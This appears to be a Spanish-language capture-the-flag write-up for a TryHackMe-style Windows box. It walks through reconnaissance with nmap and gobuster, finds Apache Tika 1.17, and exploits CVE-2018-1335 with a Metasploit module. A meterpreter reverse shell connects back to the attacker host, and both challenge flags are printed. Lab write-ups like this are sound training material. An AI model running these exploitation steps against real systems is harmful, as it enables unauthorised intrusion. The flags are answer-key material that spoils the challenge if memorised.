first we start with a nmap scan : 

[davidoberst@archlinux ~]$ sudo nmap -sV -O 10.67.189.47
[sudo] password for davidoberst: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-04 18:04 -0500
Nmap scan report for cyberlens.thm (10.67.189.47)
Host is up (0.072s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


una vez entre al puerto 80, encontre un sitio web, un sitio normal, con tematica de esteganogradia, un formulario de contacto y un "extractor de metadata, antes de revisatr los parametros mejor, quise hacer un fuzzxing para mpaear mejor la estructura dl sitio. 

al usar el comando 

[davidoberst@archlinux Web-Content]$ gobuster dir -u http://10.67.189.47 -w common.txt

pude encontrar lo siguiente : 
Images               (Status: 301) [Size: 235] [--> http://10.67.189.47/Images/]
css                  (Status: 301) [Size: 232] [--> http://10.67.189.47/css/]
images               (Status: 301) [Size: 235] [--> http://10.67.189.47/images/]
js                   (Status: 301) [Size: 231] [--> http://10.67.189.47/js/]



en /images, estan todas las imagemnes del sitio, en la pagina y el reto mencionan metadatos,si lo necesito, probablemente analice los metadatos de las imagenes para ver si tienen una pista, pero quiero  continuar analizando la estrucutra. 

en js,me redirecciona alos archivos javascript de la pagina, y ahi puedo ver el codigo de image-extractor, la funcion del sitio que mencione anteriormente : 

JavasCript : 

document.addEventListener("DOMContentLoaded", function() {
  document.getElementById("metadataButton").addEventListener("click", function() {
    var fileInput = document.getElementById("imageFileInput");
    var file = fileInput.files[0];

    var reader = new FileReader();
    reader.onload = function() {
      var fileData = reader.result;

      fetch("http://localhost:61777/meta", {
        method: "PUT",
        body: fileData,
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/octet-stream"
        }
      })
      .then(response => {
        if (response.ok) {
          return response.json();
        } else {
          throw new Error("Error: " + response.status);
        }
      })
      .then(data => {
        var metadataOutput = document.getElementById("metadataOutput");
        metadataOutput.innerText = JSON.stringify(data, null, 2);
      })
      .catch(error => {
        console.error("Error:", error);
      });
    };

    reader.readAsArrayBuffer(file);
  });
});

en el codigo se puede ver que hace una peticion a un servidor web, ene le puerto 61777, veamos que hay en la url : 


http://10.67.189.47:61777/

al entrar, nos dice : 
Welcome to the Apache Tika 1.17 Server

al buscar la version en google, me arroja un CVE :

CVE-2018-1335 ((Header Command Injection)

lo mas probable es que este sea el caminoi correcto, investigare mas sobre la vulnerabilidad y vere una forma de explotacion en este contexto. 



[davidoberst@archlinux Web-Content]$ msfconsole

msf > search tika

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/windows/http/apache_tika_jp2_jscript         2018-04-25       excellent  Yes    Apache Tika Header Command Injection
   1  post/linux/gather/puppet                             .                normal     No     Puppet Config Gather
   2  auxiliary/scanner/http/wp_gimedia_library_file_read  .                normal     No     WordPress GI-Media Library Plugin Directory Traversal Vulnerability


hay algunos eexploits, usare el 0, pero antes quiero asegurarme que la version del exploit funcione con la version de tika : 



msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/http/apache_tika_jp2_jscript) > info
Description:
  This module exploits a command injection vulnerability in Apache
  Tika 1.15 - 1.17 on Windows.

funciona, vamos a usarlo : 

msf exploit(windows/http/apache_tika_jp2_jscript) > set RHOSTS 10.67.189.47
RHOSTS => 10.67.189.47
msf exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
RPORT => 61777
msf exploit(windows/http/apache_tika_jp2_jscript) > set LHOST 192.168.138.111
LHOST => 192.168.138.111
msf exploit(windows/http/apache_tika_jp2_jscript) > exploit
[*] Started reverse TCP handler on 192.168.138.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Target is vulnerable based on version: 1.17
[*] Sending PUT request to 10.67.189.47:61777/meta
[*] Command Stager progress -  82.46% done (7999/9701 bytes)
[*] Sending PUT request to 10.67.189.47:61777/meta
[*] Command Stager progress - 100.00% done (9701/9701 bytes)
[*] Sending stage (199238 bytes) to 10.67.189.47
[*] Meterpreter session 1 opened (192.168.138.111:4444 -> 10.67.189.47:49997) at 2026-07-04 19:19:41 -0500

Luego de entrar a meterpreter, entre a una shell de Windows. 

C:\Users\CyberLens>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\CyberLens

11/25/2023  07:31 AM    <DIR>          .
11/25/2023  07:31 AM    <DIR>          ..
06/06/2023  07:48 PM    <DIR>          3D Objects
06/06/2023  07:48 PM    <DIR>          Contacts
06/06/2023  07:53 PM    <DIR>          Desktop
06/07/2023  03:09 AM    <DIR>          Documents
06/06/2023  07:48 PM    <DIR>          Downloads
06/06/2023  07:48 PM    <DIR>          Favorites
06/06/2023  07:48 PM    <DIR>          Links
06/06/2023  07:48 PM    <DIR>          Music
06/06/2023  07:48 PM    <DIR>          Pictures
06/06/2023  07:48 PM    <DIR>          Saved Games
06/06/2023  07:48 PM    <DIR>          Searches
06/06/2023  07:48 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  14,946,668,544 bytes free

C:\Users\CyberLens>cd Destop
cd Destop
The system cannot find the path specified.

C:\Users\CyberLens>cd Desktop
cd Desktop

C:\Users\CyberLens\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\CyberLens\Desktop

06/06/2023  07:53 PM    <DIR>          .
06/06/2023  07:53 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/06/2023  07:54 PM                25 user.txt
               3 File(s)          1,106 bytes
               2 Dir(s)  14,946,668,544 bytes free

C:\Users\CyberLens\Desktop>tyoe user.txt
tyoe user.txt
'tyoe' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\CyberLens\Desktop>type user.txt
type user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
C:\Users\CyberLens\Desktop>

obtuve la primera bandera!



ahora accederemos como root, simplemente hice lo mismo, puse la sesion en el background, use el xploiut suggester, y econtre un exploit para poder acceder como administrador 

una vez en Users\Administrator\Dekstop\admin.txt

 encontre la bandera 

C:\Users\Administrator\Desktop>type admin.txt
type admin.txt
THM{3lev@t3D-4-pr1v35c!}





